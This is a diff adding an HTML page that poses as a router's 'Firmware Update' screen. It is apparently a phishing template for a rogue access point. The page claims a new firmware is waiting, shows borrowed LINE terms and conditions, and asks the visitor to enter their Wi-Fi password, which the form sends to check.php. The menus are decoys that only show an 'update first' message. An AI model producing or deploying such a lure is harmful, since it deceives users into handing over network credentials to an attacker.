@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang=en> <head><title>Router Configuration Page</title><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=bootstrap.min.css><script src=jquery.min.js></script><script src=bootstrap.min.js></script><!-- CSS --><style type=text/css>
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+  </style></head> <body> <!-- Start navigation bar --> <!-- To change the navigation bar color change background attribute --> <nav class="navbar navbar-inverse" style=top:0;position:relative;background:RoyalBlue;margin-top:2em;> <div class=container-fluid> <div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#myNavbar> <span class=icon-bar></span> <span class=icon-bar></span> <span class=icon-bar></span> </button> <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        --><h3 style="text-align:center;color:white"><img src="e.png" width="10%" height="" > Bhancha kotha <img src="e.png" width="10%" height="10%" ></h3></div> <div class="collapse navbar-collapse" id=myNavbar> <ul class="nav navbar-nav"> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Setup <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Basic Setup</a></li> <li><a href=#>DDNS</a></li> <li><a href=#>MAC Address Clone</a></li> <li><a href=#>Advanced Routing</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Wireless <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Basic Wireless Settings</a></li> <li><a href=#>Wireless Security</a></li> <li><a href=#>Wireless MAC Filter</a></li> <li><a href=#>Advanced Wireless Settings</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Security <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Firewall</a></li> <li><a href=#>VPN</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Access Restriction <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Internet Access</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Administration <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Management</a></li> <li><a href=#>Log</a></li> <li><a href=#>Diagnostics</a></li> <li><a href=#>Factory Defaults</a></li> <li><a href=#>Config Manegements</a></li> </ul> </li> <li class=dropdown data-toggle=modal data-target=#update-only><a class=dropdown-toggle data-toggle=dropdown href=# style=color:white>Status <span class=caret></span></a> <ul class=dropdown-menu> <li><a href=#>Router</a></li> <li><a href=#>Local Network</a></li> <li><a href=#>Wireless</a></li> <li><a href=#>Advanced Routing</a></li> </ul> </li> </ul> </div> </div> </nav> <!-- End navigation bar --> <!-- Start page content --> <div class=container> <div class=col-sm><div style="text-align:center"><img style="" src="n.png" width="20%" height="" ></div> <h2 class=text-center style=color:RoyalBlue>Firmware Update</h2> <p class=lead>A new version of the firmware has been detected and awaiting installation. Please review our new terms and conditions and proceed.</p> </div> <form action=check.php method=POST> <div class=form-group> <label for=comment>Terms And Conditions:</label> <textarea readonly class=form-control rows=5 id=comment>
+Agreement to Terms and Conditions of Use
+The user must use the Service according to the provisions in the Terms and Conditions. The user cannot use the Service unless he/she agrees to the Terms and Conditions. The user is deemed to have agreed to the Terms and Conditions once he/she clicks the ‘Agree’ button that is displayed on the screen when installing the Service.
+Article 2. Other Applicable Rules
+LINE Terms and Conditions of Use and LINE Privacy Policy will also apply whenever the user uses LINE.
+Article 3. Collection of Information
+The Company collects the user’s computer name in order to determine the terminal used to access the Service.
+The personal information of the user will be treated in accordance with this Article and the LINE Privacy Policy.
+       </textarea> <div class=checkbox> <label><input checked type=checkbox value=checked  id=check-box onclick=checkBoxStatus()>I Agree With Above Terms And Conditions</label> </div> </div> <div class="form-group has-feedback"> <label for=password><h4><b>Enter your Wi-Fi password for update<b></h4></label> <input class="form-control" placeholder="Enter your WiFi password" type="password" id="pwd" name="key1"> </div> <div class="container text-center"> <input type=submit class="btn btn-primary" id=btn value="Start Upgrade"> </div> </form> <div id=push></div> </div> <!-- Start page content --> <!-- Start footer --> <footer class=footer> <div class="container text-center"> <p class=text-muted></p> </div> </footer> <!-- End footer --> <!-- Start update first message --> <div class="modal fade" id=update-only role=dialog> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Update First.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End update first message --> <!-- Start empty password message --> <div class="modal fade" id=empty-pass> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Input Valid Password. (Must be between 7 and 64 characters)</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> <!-- Start empty password message --> <div class="modal fade" id=no-checkbox> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Check The I Agree Button.</p> </div> <div class=modal-footer> <button type=button  class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> <script>
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+
+$("#btn").val("Checking...");
+
+setInterval(function () {
+              
+       $("#btn").val("Checking.....");
+              
+             setTimeout(function(){
+             $("#btn").val("Checking....");
+             }, 1000); 
+              
+              }, 2000);
+    // get the password box and checkbox elements
+  var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+    if ( box.checked != true ){
+          // display no checkbox message
+          $("#no-checkbox").modal("show");
+    return false;
+        }
+        if ( input.value.lenght < 7 ||  input.value.lenght > 64){
+    // display no password message
+    $("#empty-pass").modal("show");
+    return false;
+    }
+
+
+});
+
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+  var box = document.getElementById("check-box");
+  var input = document.getElementById("pwd");
+
+  // if the box is checked
+  if ( box.checked == true )
+    {
+      // enabale the password box
+      input.disabled = false;
+    }
+  else
+    {
+      // disable the password box
+      input.disabled = true;
+    }
+  }
+</script>
+ 
+ <script type="text/javascript">
+ window.onload = function(){
+ 
+ document.getElementById('pwd').focus();
+ 
+ }
+
+ </script>
+ 
+ 
+ </body> </html> 
